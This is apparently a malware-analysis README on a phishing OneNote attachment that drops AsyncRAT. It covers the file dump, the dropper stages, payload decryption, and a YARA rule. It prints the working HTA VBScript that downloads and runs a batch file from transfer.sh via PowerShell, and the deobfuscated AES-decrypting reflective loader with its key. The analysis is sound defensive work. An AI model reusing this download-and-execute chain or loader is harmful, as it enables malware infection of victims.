# Malicious-OneNote-AsyncRAT-Analysis

Security Researchers discovered that Threat actors now using OneNote attachments in phishing emails that infect victims with remote access malware which can be used to install further malware, steal passwords, or even cryptocurrency wallets.

## Malware Sample

> **MD5:** af9e5a25e7ce6b5cdfbb8ebbede5de0c

> **SHA256:** 15212428deeeabcd5b11a1b8383c654476a3ea1b19b804e4aca606fac285387f

## Basic Static Analysis

- Attackers sending OneNote file as an attachment using email and using simple trick to hide suspicious script. 

- The suspicious VBS macro linked to the "Click to view document" PNG picture is just behind this picture.  

- Once User clicked on view document  VBS macro will execute.

![image](https://user-images.githubusercontent.com/43460691/216254324-951b4861-e580-4d77-901c-fcd8cbf620c5.png)

## Dump OneNote File content 

- There is an awesome tool created by Didier Stevens to dump content from the OneNote file. Check the below output. OneNote file containing two PNG and one HTA file.

- Steam number 2 holds the HTA script (starting with "<!").

> ***`REMnux: python3 onedump.py "file name"`***

![image](https://user-images.githubusercontent.com/43460691/216254734-737826fe-afc8-4f3e-a4e6-6f2808bae465.png)

- Below are the dumped files, Where "Click to view document" image used to trick user and execute script.

![image](https://user-images.githubusercontent.com/43460691/216254817-9180ca56-1b3f-42eb-8ad1-903b4f1e38c8.png)


- If you look into below HTA file  we can see first ExecuteCmdAsync invoke WebRequest -Uri and downloading **notes_to_do_list.one** file and writing on disk as invoice.one which is simple note and not malicious.

- The second  ExecuteCmdAsync  downloading sky.bat file and writing on disk in tmp folder as system32.bat and execute.

![image](https://user-images.githubusercontent.com/43460691/216255016-54797b05-27ba-493d-8e14-b21d702ee5a7.png)

## Strings Check

- HTA file is not obfuscated and we can see HTA file in Strings output as well.

> ***`REMnux: strings "file name"`***

```
remnux@remnux:~/Downloads$ strings Invoice.one 
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
<script type="text/vbscript">
' Exec process using WMI
Function WmiExec(cmdLine ) 
    Dim objConfig 
    Dim objProcess 
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function
Private Function dukpatek(myObjP , myObjC , myCmdL ) 
    Dim procId 
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://www.onenotegem.com/uploads/soft/one-templates/notes_to_do_list.one -OutFile $env:tmp\invoice.one; Start-Process -Filepath $env:tmp\invoice.one"
	    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://transfer.sh/get/5dLEvB/sky.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub
' Exec process using WScript.Shell (asynchronous)
Sub WscriptExec(cmdLine )
    CreateObject("WScript.Shell").Run cmdLine, 0
End Sub
Sub ExecuteCmdAsync(targetPath )
    On Error Resume Next
    Err.Clear
    wimResult = WmiExec(targetPath)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        WscriptExec targetPath
    End If
    On Error Goto 0
End Sub
window.resizeTo 0,0
AutoOpen
remnux@remnux:~/Downloads$ 
```

## Second Stage Payload 

- System32.bat file is obfuscated, Lot of environment variables are created and concatenated to build commands. If it's difficult to read, it's easy to deobfuscate. 

- Just add a "echo" at the beginning of all lines at the bottom of the file and execute it or you can use Procmon tool to PowerShell executed command.

![image](https://user-images.githubusercontent.com/43460691/216255585-757086c3-90c7-40c2-88ed-97b47c3df79d.png)

- Capture the process ecexution using Procmon, If you open the process start operation you can see the deobfuscated command.

![image](https://user-images.githubusercontent.com/43460691/216359119-9be8ed37-8a16-4924-8dcc-ae34e2c52d8a.png)


- This script is a dropper. You can see base64 encoded payload is located in the file and read by PowerShell. Payload is identified by lines starting with **":: ".** 

```
"system32.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\admin\AppData\Local\Temp\system32.bat').Split([Environment]::NewLine)
foreach ($YiLGW in $eIfqq) 
{ 
  if ($YiLGW.StartsWith(':: ')) 
     { 
	    $VuGcO = $YiLGW.Substring(3)
        break
     }
}
$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO)
$BacUA = New-Object System.Security.Cryptography.AesManaged
$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC
$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('CeRsc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=')
$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==')

$Nlgap = $BacUA.CreateDecryptor()
$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length)
$Nlgap.Dispose()
$BacUA.Dispose()
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm)
$bTMLk = New-Object System.IO.MemoryStream
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress)
$NVPbn.CopyTo($bTMLk)
$NVPbn.Dispose()
$mNKMr.Dispose()
$bTMLk.Dispose()
$uZOcm = $bTMLk.ToArray()
$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm)
$PtfdQ = $gDBNO.EntryPoint
$PtfdQ.Invoke($null, (, [string[]] ('')))
![image](https://user-images.githubusercontent.com/43460691/216255789-c6e19f63-9991-4a34-b805-3de608cc2353.png)
```

## Payload Extraction 

- The payload is AES encrypted, you can see AES keys in deobfuscated script. We will use these keys to decrypt payload.

![image](https://user-images.githubusercontent.com/43460691/216255929-d279b878-b913-498a-a7e7-cfdaed87335a.png)


![image](https://user-images.githubusercontent.com/43460691/216255962-7725f621-9a49-4b2e-94eb-8fb784d93142.png)

- The decrypted PE file is an ASyncRAT. Check the below file hash.

> **SHA256:** f8b823dc5519d25ef2599725c25306171a8496069b1ba56cb854323ae98d10d1

![image](https://user-images.githubusercontent.com/43460691/216351747-ae3a9ad8-3518-462d-887b-86fe524c28fa.png)


## YARA Rule

```
rule malicious_onenote {
    meta:
        description = "Detects malicious onenote files"

    strings:
        $hta = "hta:application" nocase
        $hta_script = "type=\"text/vbscript\""
        $hta_open = "autoopen" nocase

    condition:
        uint32be(0x0) == 0xE4525C7B
        and 2 of them
}
```
- You can find detailed Yara rule on YARAify website.

  https://yaraify.abuse.ch/yarahub/rule/MALWARE_OneNote_Delivery_Jan23/


## References :

- https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/

- https://fourcore.io/blogs/hackers-using-microsoft-onenote-attachments-to-spread-malware

- https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/

- https://gchq.github.io/CyberChef/








